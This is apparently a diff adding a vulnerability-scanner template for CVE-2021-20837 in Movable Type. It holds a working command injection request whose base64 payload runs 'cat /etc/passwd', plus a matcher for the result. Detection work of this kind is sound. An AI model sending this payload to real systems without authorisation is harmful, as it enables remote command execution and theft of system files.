@@ -1,0 +1,42 @@
+id: CVE-2021-20837
+
+info:
+  name: Movable Type XMLRPC API vulnerable to OS command injection
+  author: Min Won
+  description: Movable Type 7 r.5002 and earlier (Movable Type 7 Series), Movable Type 6.8.2 and earlier (Movable Type 6 Series), Movable Type Advanced 7 r.5002 and earlier (Movable Type Advanced 7 Series), Movable Type Advanced 6.8.2 and earlier (Movable Type Advanced 6 Series), Movable Type Premium 1.46 and earlier, and Movable Type Premium Advanced 1.46 and earlier allow remote attackers to execute arbitrary OS commands via unspecified vectors. Note that all versions of Movable Type 4.0 or later including unsupported (End-of-Life, EOL) versions are also affected by this vulnerability. Crd --> Orginal Researcher..
+  reference: https://nvd.nist.gov/vuln/detail/CVE-2021-20837
+  severity: high
+  tags: cve,cve2021,rce
+
+requests:
+  - raw:
+      - |
+        POST /cgi-bin/mt/mt-xmlrpc.cgi HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: POC
+        Accept: */*
+        Content-Length: 198
+        Connection: close
+        Content-Type: text/xml
+        
+        <?xml version="1.0" encoding="UTF-8"?>
+        <methodCall>
+        <methodName>mt.handler_to_coderef</methodName>
+        <params>
+        <param>
+        <value>
+        <base64>
+        YGNhdCAvZXRjL3Bhc3N3ZGA=
+        </base64>
+        </value>
+        </param>
+        </params>
+        </methodCall>
+
+    matchers-condition: and
+    matchers:
+      - type: regex
+        regex:
+          - "root:.*:0:0:"
+        part: body
+          
